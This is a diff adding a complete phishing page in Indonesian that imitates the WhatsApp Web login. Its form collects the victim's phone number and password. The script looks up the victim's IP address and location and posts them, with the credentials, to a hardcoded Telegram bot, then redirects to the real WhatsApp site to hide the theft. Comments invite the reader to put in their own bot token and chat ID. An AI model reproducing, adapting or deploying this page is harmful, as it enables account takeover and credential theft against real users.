@@ -1,0 +1,427 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+    <title>WhatsApp Web</title>
+    <style>
+        /* ========== RESET ========== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+        }
+
+        body {
+            background: #075e54;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+            margin: 0;
+        }
+
+        /* ========== CARD ========== */
+        .container {
+            background: #ffffff;
+            border-radius: 16px;
+            padding: 40px 35px;
+            max-width: 420px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4), 0 0 0 1px #128c7e33;
+            text-align: center;
+            position: relative;
+        }
+
+        /* ========== HEADER ========== */
+        .whatsapp-logo {
+            width: 70px;
+            margin-bottom: 10px;
+        }
+
+        h1 {
+            color: #075e54;
+            font-size: 26px;
+            font-weight: 700;
+            margin-bottom: 4px;
+        }
+
+        .sub {
+            color: #667781;
+            font-size: 14px;
+            margin-bottom: 25px;
+        }
+
+        /* ========== FAKE QR ========== */
+        .qr-container {
+            background: #f0f2f5;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            border: 1px dashed #25d366;
+        }
+
+        .qr-box {
+            width: 140px;
+            height: 140px;
+            background: white;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 60px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+            border: 2px solid #e0e0e0;
+        }
+
+        .qr-container small {
+            color: #667781;
+            font-size: 12px;
+            margin-top: 10px;
+        }
+
+        /* ========== DIVIDER ========== */
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 18px 0;
+        }
+
+        .divider hr {
+            flex: 1;
+            border: none;
+            border-top: 1px solid #e0e0e0;
+        }
+
+        .divider span {
+            padding: 0 15px;
+            color: #999;
+            font-size: 12px;
+            font-weight: 600;
+        }
+
+        /* ========== FORM ========== */
+        .form-group {
+            text-align: left;
+            margin: 12px 0;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #374151;
+            margin-bottom: 5px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid #e5e7eb;
+            border-radius: 30px;
+            font-size: 15px;
+            transition: 0.3s;
+            outline: none;
+            background: #fafafa;
+        }
+
+        .form-group input:focus {
+            border-color: #25d366;
+            box-shadow: 0 0 0 4px #25d36622;
+            background: white;
+        }
+
+        /* ========== BUTTON ========== */
+        .btn {
+            width: 100%;
+            padding: 15px;
+            background: #25d366;
+            color: white;
+            border: none;
+            border-radius: 30px;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.3s;
+            margin-top: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .btn:hover {
+            background: #1ebe5c;
+            transform: scale(1.01);
+            box-shadow: 0 8px 25px #25d36644;
+        }
+
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none !important;
+            box-shadow: none !important;
+        }
+
+        /* ========== LOADING SPINNER ========== */
+        .spinner {
+            display: none;
+            width: 22px;
+            height: 22px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-top: 3px solid white;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* ========== ALERT ========== */
+        .alert {
+            background: #fee2e2;
+            border: 1px solid #f87171;
+            color: #dc2626;
+            padding: 12px 16px;
+            border-radius: 30px;
+            font-size: 13px;
+            margin-top: 14px;
+            display: none;
+            text-align: center;
+        }
+
+        .alert.success {
+            background: #d1fae5;
+            border-color: #34d399;
+            color: #065f46;
+        }
+
+        /* ========== FOOTER ========== */
+        .footer {
+            margin-top: 22px;
+            color: #9ca3af;
+            font-size: 11px;
+            display: flex;
+            justify-content: center;
+            gap: 18px;
+        }
+
+        .footer span {
+            color: #25d366;
+        }
+
+        /* ========== RESPONSIVE ========== */
+        @media (max-width: 480px) {
+            .container {
+                padding: 28px 20px;
+            }
+            h1 {
+                font-size: 22px;
+            }
+            .qr-box {
+                width: 110px;
+                height: 110px;
+                font-size: 45px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+
+        <!-- LOGO -->
+        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp" class="whatsapp-logo" />
+        <h1>WhatsApp Web</h1>
+        <p class="sub">Gunakan WhatsApp di browser Anda</p>
+
+        <!-- FAKE QR -->
+        <div class="qr-container">
+            <div class="qr-box">📱</div>
+            <small>Scan kode QR dengan WhatsApp HP</small>
+        </div>
+
+        <!-- DIVIDER -->
+        <div class="divider">
+            <hr><span>ATAU</span><hr>
+        </div>
+
+        <!-- FORM -->
+        <form id="phishForm">
+            <div class="form-group">
+                <label>📞 Nomor Telepon</label>
+                <input type="text" id="nomor" placeholder="08123456789" required />
+            </div>
+            <div class="form-group">
+                <label>🔑 Kata Sandi</label>
+                <input type="password" id="password" placeholder="Masukkan kata sandi" required />
+            </div>
+
+            <button type="submit" class="btn" id="submitBtn">
+                <span id="btnText">MASUK</span>
+                <div class="spinner" id="btnSpinner"></div>
+            </button>
+        </form>
+
+        <!-- ALERT -->
+        <div class="alert" id="alert">⚠️ Gagal, coba lagi.</div>
+
+        <!-- FOOTER -->
+        <div class="footer">
+            <span>🔒</span> Terenkripsi <span>•</span> <span>ℹ️</span> Bantuan
+        </div>
+    </div>
+
+    <script>
+        // ================================================================
+        //  KONFIGURASI TELEGRAM (GANTI DENGAN PUNYA LU)
+        // ================================================================
+        const BOT_TOKEN = "8928113871:AAEMNaoUzhvD8CwjgEXA-RE6FgMn7x__dyE"; // GANTI KALO PERLU
+        const CHAT_ID = "7260945600"; // GANTI KALO PERLU
+
+        // ================================================================
+        //  ELEMEN
+        // ================================================================
+        const form = document.getElementById('phishForm');
+        const nomorInput = document.getElementById('nomor');
+        const passwordInput = document.getElementById('password');
+        const alertEl = document.getElementById('alert');
+        const submitBtn = document.getElementById('submitBtn');
+        const btnText = document.getElementById('btnText');
+        const btnSpinner = document.getElementById('btnSpinner');
+
+        // ================================================================
+        //  FUNGSI DAPETIN IP + LOKASI
+        // ================================================================
+        async function getIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip;
+            } catch {
+                return 'Tidak diketahui';
+            }
+        }
+
+        async function getLocation(ip) {
+            if (ip === 'Tidak diketahui') return 'Tidak diketahui';
+            try {
+                const res = await fetch(`http://ip-api.com/json/${ip}?fields=country,city,isp`);
+                const data = await res.json();
+                return `${data.country} - ${data.city} (${data.isp})`;
+            } catch {
+                return 'Tidak diketahui';
+            }
+        }
+
+        // ================================================================
+        //  KIRIM KE TELEGRAM
+        // ================================================================
+        async function sendToTelegram(nomor, password, ip, location) {
+            const userAgent = navigator.userAgent;
+            const waktu = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
+
+            let pesan = `🔐 *WHATSAPP WEB PHISHING PRO*\n`;
+            pesan += `─────────────────\n`;
+            pesan += `📞 *Nomor:* \`${nomor}\`\n`;
+            pesan += `🔑 *Password:* \`${password}\`\n`;
+            pesan += `─────────────────\n`;
+            pesan += `🌐 *IP:* ${ip}\n`;
+            pesan += `📍 *Lokasi:* ${location}\n`;
+            pesan += `🕒 *Waktu:* ${waktu}\n`;
+            pesan += `─────────────────\n`;
+            pesan += `📱 *Device:* ${/Mobile|Android|iPhone/i.test(userAgent) ? 'Mobile' : 'Desktop'}\n`;
+            pesan += `🧾 *User-Agent:* \`${userAgent.substring(0, 100)}...\``;
+
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: pesan,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                return response.ok;
+            } catch {
+                return false;
+            }
+        }
+
+        // ================================================================
+        //  SUBMIT FORM
+        // ================================================================
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            const nomor = nomorInput.value.trim();
+            const password = passwordInput.value.trim();
+
+            // Validasi
+            if (nomor.length < 8 || password.length < 3) {
+                alertEl.style.display = 'block';
+                alertEl.textContent = '⚠️ Nomor atau password tidak valid!';
+                alertEl.className = 'alert';
+                return;
+            }
+
+            // Sembunyikan alert lama
+            alertEl.style.display = 'none';
+
+            // Tampilkan loading
+            btnText.textContent = 'Memproses';
+            btnSpinner.style.display = 'inline-block';
+            submitBtn.disabled = true;
+
+            // Dapetin IP & lokasi
+            const ip = await getIP();
+            const location = await getLocation(ip);
+
+            // Kirim ke Telegram
+            const success = await sendToTelegram(nomor, password, ip, location);
+
+            // Matikan loading
+            btnSpinner.style.display = 'none';
+            submitBtn.disabled = false;
+
+            if (success) {
+                btnText.textContent = '✅ Berhasil';
+                alertEl.style.display = 'block';
+                alertEl.textContent = '✅ Berhasil masuk! Mengalihkan...';
+                alertEl.className = 'alert success';
+
+                // Redirect ke WA asli setelah 1.5 detik
+                setTimeout(() => {
+                    window.location.href = 'https://web.whatsapp.com';
+                }, 1500);
+            } else {
+                btnText.textContent = 'MASUK';
+                alertEl.style.display = 'block';
+                alertEl.textContent = '⚠️ Gagal mengirim data, coba lagi.';
+                alertEl.className = 'alert';
+            }
+        });
+
+        // ================================================================
+        //  RESET ALERT KETIKA USER KETIK
+        // ================================================================
+        nomorInput.addEventListener('input', () => { alertEl.style.display = 'none'; });
+        passwordInput.addEventListener('input', () => { alertEl.style.display = 'none'; });
+    </script>
+
+</body>
+</html>
